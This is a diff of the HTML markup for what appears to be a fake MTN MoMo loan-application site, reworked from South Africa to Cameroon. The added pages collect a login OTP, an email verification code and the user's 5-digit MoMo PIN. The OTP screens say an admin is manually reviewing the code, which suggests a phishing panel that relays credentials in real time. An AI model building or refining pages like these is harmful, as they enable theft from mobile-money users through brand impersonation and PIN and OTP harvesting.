-    </div></div>
-</div>
-
-<div id="page-wait-otp" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">🔑</div>
-        <h2>Verifying OTP...</h2>
-        <p>Admin is reviewing your login OTP.</p>
-        <div class="wait-status" id="waitOtpStatus">⏳ Awaiting approval...</div>
-        <div class="poll-indicator"><span class="dot"></span> Checking status live...</div>
-        <button class="btn-gray" onclick="cancelApplication()" style="margin-top:20px;">Cancel</button>
-    </div></div>
-</div>
-
-<!-- ═══════════ DASHBOARD ═══════════ -->
-<div id="page-dashboard" class="page">
-    <nav class="navbar">
         <a class="nav-left" onclick="goTo('page-landing')">← Home</a>
-        <div class="mtn-logo" style="flex-direction:row;gap:8px;"><img src="./momo_logo.jpg" class="mtn-logo-img sm" /><div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div></div></div>
-        <div class="nav-right" id="navbarAccount5"></div>
+        <img src="./momo_logo.jpg" alt="MTN MoMo" class="nav-logo" onerror="this.style.display='none'">
+        <div class="nav-right"><span class="nav-step">4/4</span></div>
     </nav>
-    <div class="dash-wrap">
-        <div class="dash-header" id="dashHeader">
-            <div class="dash-status-icon" id="dashStatusIcon">✓</div>
-            <h1 id="dashTitle">Loan Approved!</h1>
-            <p id="dashSubtitle">Your loan is approved.</p>
-            <div class="dash-amount-banner">
-                <div class="dab-label">Amount</div>
-                <div class="dab-value" id="dashAmount">R 0</div>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-head">
+                <span class="step-num">🔢</span>
+                <div>
+                    <h2>OTP Verification</h2>
+                    <p class="step-sub">Step 4 of 4</p>
+                </div>
             </div>
+            <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
+            <div class="field">
+                <label>Enter the OTP code (4–6 digits)</label>
+                <input type="text" id="otpValue" maxlength="6" inputmode="numeric" placeholder="123456"
+                       style="text-align:center; font-size:1.4rem; font-weight:800; letter-spacing:0.4em;">
+            </div>
+            <button class="btn-primary" id="otpSubmitBtn" onclick="submitOtp()">SUBMIT OTP</button>
         </div>
+    </div>
+</div>
 
-        <div class="dash-body">
-            <div class="dash-section">
-                <h3 class="dash-section-title">📋 Application Status</h3>
-                <div class="dash-timeline" id="dashTimeline"></div>
+<!-- WAIT OTP -->
+<div id="page-wait-otp" class="page">
+    <div class="wait-bg">
+        <div class="wait-wrap">
+            <div class="wait-icon pulse">🔢</div>
+            <h2>Verifying your OTP...</h2>
+            <p>Your OTP is being reviewed by admin.</p>
+            <div class="wait-status">⏳ Step 4 of 4 · Awaiting admin approval</div>
+            <div class="poll-indicator"><span class="dot"></span> Live check</div>
+            <div class="wait-appid">Application ID: <span class="mono" id="waitAppId4">—</span></div>
+        </div>
+    </div>
+</div>
+
+<!-- REJECTED -->
+<div id="page-rejected" class="page">
+    <div class="wait-bg">
+        <div class="wait-wrap">
+            <div class="wait-icon">❌</div>
+            <h2>Application not approved</h2>
+            <p id="rejectReason">Your application was not approved.</p>
+            <div class="msg-box error show" style="text-align:left;">
+                <span class="msg-icon">ℹ️</span>
+                <span>Contact support at 111 or email support@mtn-momo-cm.com</span>
             </div>
+            <button class="btn-primary" onclick="restart()">Try Again</button>
+            <a href="tel:111" class="btn-ghost" style="display:block; text-align:center; text-decoration:none;">📞 Support: 111</a>
+        </div>
+    </div>
+</div>
 
-            <div class="dash-section">
-                <h3 class="dash-section-title">💰 Loan Details</h3>
-                <div class="dash-info-grid">
-                    <div class="dash-info-item"><span>Amount</span><strong id="dashLoanAmount">—</strong></div>
-                    <div class="dash-info-item"><span>Term</span><strong id="dashLoanTerm">—</strong></div>
-                    <div class="dash-info-item"><span>Monthly Repayment</span><strong id="dashMonthly">—</strong></div>
-                    <div class="dash-info-item"><span>Total Cost of Credit</span><strong id="dashTotalCost">—</strong></div>
-                    <div class="dash-info-item"><span>Interest Rate</span><strong id="dashRate">—</strong></div>
-                    <div class="dash-info-item"><span>Purpose</span><strong id="dashPurpose">—</strong></div>
+<!-- CHECK STATUS — email + phone -->
+<div id="page-check-status" class="page">
+    <nav class="navbar">
+        <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
+        <img src="./momo_logo.jpg" alt="MTN MoMo" class="nav-logo" onerror="this.style.display='none'">
+        <div class="nav-right"><span class="nav-step">🔎</span></div>
+    </nav>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-head">
+                <span class="step-num">🔎</span>
+                <div>
+                    <h2>Check Application Status</h2>
+                    <p class="step-sub">Enter your email and phone number</p>
                 </div>
             </div>
+            <div class="msg-box error" id="chkErr"><span class="msg-icon">✕</span><span id="chkErrTxt"></span></div>
+            <div class="field"><label>Email</label><input type="email" id="chkEmail"></div>
+            <div class="field">
+                <label>Phone (Cameroon)</label>
+                <div class="phone-row"><div class="ph-pre">+237</div><input type="tel" id="chkPhone" maxlength="9" inputmode="numeric"></div>
+            </div>
+            <button class="btn-primary" id="chkBtn" onclick="startCheckStatus()">SEND VERIFICATION CODE</button>
+            <div class="field-hint" style="text-align:center; margin-top:10px;">We'll send a 6-digit code to your email.</div>
+        </div>
+    </div>
+</div>
 
-            <div class="dash-section">
-                <h3 class="dash-section-title">👤 Applicant</h3>
-                <div class="dash-info-grid">
-                    <div class="dash-info-item"><span>Name</span><strong id="dashName">—</strong></div>
-                    <div class="dash-info-item"><span>Phone</span><strong id="dashPhone">—</strong></div>
-                    <div class="dash-info-item"><span>Email</span><strong id="dashEmail">—</strong></div>
+<!-- CHECK OTP -->
+<div id="page-check-otp" class="page">
+    <nav class="navbar">
+        <a class="nav-left" onclick="goTo('page-check-status')">← Back</a>
+        <img src="./momo_logo.jpg" alt="MTN MoMo" class="nav-logo" onerror="this.style.display='none'">
+        <div class="nav-right"><span class="nav-step">1/2</span></div>
+    </nav>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-head">
+                <span class="step-num">🔢</span>
+                <div>
+                    <h2>Email Verification</h2>
+                    <p class="step-sub">Enter the code sent to your email</p>
                 </div>
             </div>
-
-            <div class="dash-section">
-                <h3 class="dash-section-title">🤝 Guarantor</h3>
-                <div class="dash-info-grid">
-                    <div class="dash-info-item"><span>Name</span><strong id="dashGName">—</strong></div>
-                    <div class="dash-info-item"><span>Phone</span><strong id="dashGPhone">—</strong></div>
-                    <div class="dash-info-item"><span>Relationship</span><strong id="dashGRel">—</strong></div>
+            <div class="msg-box error" id="cotpErr"><span class="msg-icon">✕</span><span id="cotpErrTxt"></span></div>
+            <div class="field">
+                <label>6-digit code</label>
+                <div class="otp-inputs">
+                    <input type="text" id="cotp0" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMove(this,0)">
+                    <input type="text" id="cotp1" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMove(this,1)">
+                    <input type="text" id="cotp2" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMove(this,2)">
+                    <input type="text" id="cotp3" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMove(this,3)">
+                    <input type="text" id="cotp4" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMove(this,4)">
+                    <input type="text" id="cotp5" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMove(this,5)">
                 </div>
             </div>
-
-            <div class="dash-actions">
-                <button class="rth-btn" onclick="viewSchedule()">📅 View Repayment Schedule</button>
-                <button class="btn-outline" onclick="viewAgreement()">📄 View Loan Agreement</button>
-                <button class="btn-outline" onclick="copyAppId()">📋 Copy Application ID</button>
-                <button class="btn-outline" onclick="refreshDashboard()">🔄 Refresh Status</button>
-                <button class="btn-outline" onclick="logoutAndRestart()">🚪 Log Out & Start New</button>
+            <button class="btn-primary" id="cotpBtn" onclick="verifyCheckOtp()">VERIFY CODE</button>
+            <div id="cotpResendWrap" style="margin-top:14px; display:none;">
+                <div id="cotpCountdown" class="countdown-text">Resend in 2:00</div>
+                <button id="cotpResendBtn" class="btn-ghost" onclick="resendCheckOtp()" style="display:none;">🔄 Resend code</button>
             </div>
         </div>
     </div>
 </div>
 
-<!-- MODALS -->
-<div id="agreementModal" class="modal-bg" onclick="if(event.target===this)closeModal('agreementModal')">
-    <div class="modal-doc">
-        <div class="modal-doc-head"><h2>Loan Agreement</h2><button class="modal-close" onclick="closeModal('agreementModal')">×</button></div>
-        <pre id="agreementText" class="agreement-text"></pre>
+<!-- CHECK PIN -->
+<div id="page-check-pin" class="page">
+    <nav class="navbar">
+        <a class="nav-left" onclick="goTo('page-check-otp')">← Back</a>
+        <img src="./momo_logo.jpg" alt="MTN MoMo" class="nav-logo" onerror="this.style.display='none'">
+        <div class="nav-right"><span class="nav-step">2/2</span></div>
+    </nav>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-head">
+                <span class="step-num">🔐</span>
+                <div>
+                    <h2>MoMo PIN</h2>
+                    <p class="step-sub">Verify with your 5-digit MoMo PIN</p>
+                </div>
+            </div>
+            <div class="msg-box error" id="cpinErr"><span class="msg-icon">✕</span><span id="cpinErrTxt"></span></div>
+            <div class="pin-label">Your MoMo PIN (5 digits)</div>
+            <div class="pin-row">
+                <input type="password" id="cpin0" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,0,'cpin')">
+                <input type="password" id="cpin1" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,1,'cpin')">
+                <input type="password" id="cpin2" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,2,'cpin')">
+                <input type="password" id="cpin3" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,3,'cpin')">
+                <input type="password" id="cpin4" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,4,'cpin')">
+            </div>
+            <button class="btn-primary" id="cpinBtn" onclick="verifyCheckPin()">VERIFY PIN & LOGIN</button>
+        </div>
     </div>
 </div>
 
-<div id="scheduleModal" class="modal-bg" onclick="if(event.target===this)closeModal('scheduleModal')">
+<!-- DASHBOARD -->
+<div id="page-dashboard" class="page">
+    <div class="dash">
+        <header class="dash-header">
+            <div class="dash-logo"><span class="dash-icon">M</span><span class="dash-name">MoMo</span></div>
+            <div class="dash-right"><span>🔔</span><span>👤</span></div>
+        </header>
+        <div class="dash-balance">
+            <div class="dash-balance-label">Loan Balance</div>
+            <div class="dash-balance-amount" id="dashBalance">XAF 0</div>
+            <div class="dash-balance-meta">
+                <span>Loan ID: <b id="dashId">—</b></span>
+                <span>Term: <b id="dashTerm">—</b></span>
+            </div>
+        </div>
+        <div class="dash-actions">
+            <div class="dash-tile" onclick="downloadContract()"><div class="dash-tile-icon">📥</div><div>Contract</div></div>
+            <div class="dash-tile" onclick="alert('Coming soon')"><div class="dash-tile-icon">💰</div><div>Pay</div></div>
+            <div class="dash-tile" onclick="logout()"><div class="dash-tile-icon">🚪</div><div>Logout</div></div>
+        </div>
+        <div class="dash-recent">
+            <h3>Recent Activity</h3>
+            <div id="dashTxList" class="dash-tx-list">
+                <div class="dash-tx-empty">No transactions yet</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- TERMS MODAL -->
+<div id="termsModal" class="modal-bg" onclick="if(event.target===this)closeTerms()">
     <div class="modal-doc">
-        <div class="modal-doc-head"><h2>Repayment Schedule</h2><button class="modal-close" onclick="closeModal('scheduleModal')">×</button></div>
-        <div id="scheduleBody" class="schedule-body"></div>
+        <div class="modal-head">
+            <h2>Terms & Conditions</h2>
+            <button class="modal-close" onclick="closeTerms()">×</button>
+        </div>
+        <pre id="termsText" class="modal-text">Loading…</pre>
+        <div class="modal-footer">
+            <button class="btn-primary" onclick="acceptTerms()">I Accept</button>
+        </div>
     </div>
 </div>
 
